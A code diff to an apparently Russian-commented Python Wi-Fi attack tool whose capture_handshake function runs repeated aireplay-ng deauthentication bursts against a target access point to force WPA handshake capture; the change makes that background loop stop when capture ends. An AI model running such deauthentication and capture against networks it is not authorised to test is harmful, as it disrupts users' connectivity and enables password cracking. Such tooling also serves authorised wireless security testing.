@@ -592,6 +592,9 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
         if cap_term is not None:
             print(f"[*] Захват открыт в отдельном окне ({term_name}).")
 
+    # Общий флаг остановки для фоновых потоков (watchdog + fallback-деаут).
+    stop_watchdog = threading.Event()
+
     # Окно с деаутентификацией
     deauth_term = None
     if deauth:
@@ -601,14 +604,18 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
             if deauth_term is not None:
                 print(f"[*] Деаутентификация открыта во втором окне ({term_name}).")
         else:
-            # Fallback: фоновый цикл без вывода
+            # Fallback: фоновый цикл без вывода. Завязан на stop_watchdog,
+            # иначе поток деаутил бы вечно и после завершения захвата.
             def _deauth_loop():
-                while True:
+                while not stop_watchdog.is_set():
                     subprocess.run(
                         ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                     )
-                    time.sleep(20)
+                    for _ in range(20):
+                        if stop_watchdog.is_set():
+                            break
+                        time.sleep(1)
             threading.Thread(target=_deauth_loop, daemon=True).start()
             print("[*] Деаутентификация запущена в фоне (без вывода).")
 
@@ -621,7 +628,6 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
     csv_file = cap_file.replace("-01.cap", "-01.csv")
     watch_files = [cap_file, csv_file]
 
-    stop_watchdog = threading.Event()
     watchdog = threading.Thread(
         target=_revive_watchdog,
         args=(interface, watch_files, stop_watchdog),
